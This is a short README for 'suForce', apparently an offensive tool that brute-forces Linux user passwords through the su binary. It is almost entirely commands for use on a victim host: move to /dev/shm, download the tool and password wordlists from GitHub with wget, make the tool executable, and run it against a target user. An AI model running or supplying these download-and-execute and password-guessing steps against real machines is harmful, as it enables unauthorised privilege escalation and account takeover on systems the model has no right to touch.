# suForce

**`suForce` performs `brute force` attacks on user `passwords` by abusing the `su` binary.**

![](/screenshot.png)

- <kbd>Download suForce</kbd>

```cmd
user@vitim:~$ cd /dev/shm
user@vitim:~$ wget -q "https://raw.githubusercontent.com/d4t4s3c/suForce/main/suForce"
user@vitim:~$ chmod +x suForce
```

- <kbd>Download Wordlist (Optional)</kbd>

```cmd
user@vitim:~$ wget -q "https://raw.githubusercontent.com/d4t4s3c/suForce/main/techyou.txt"
user@vitim:~$ wget -q "https://raw.githubusercontent.com/d4t4s3c/suForce/main/top12000.txt"
```

- <kbd>Use</kbd>

```cmd
user@vitim:~$ ./suForce -u <USER> -w <WORDLIST>
```

---
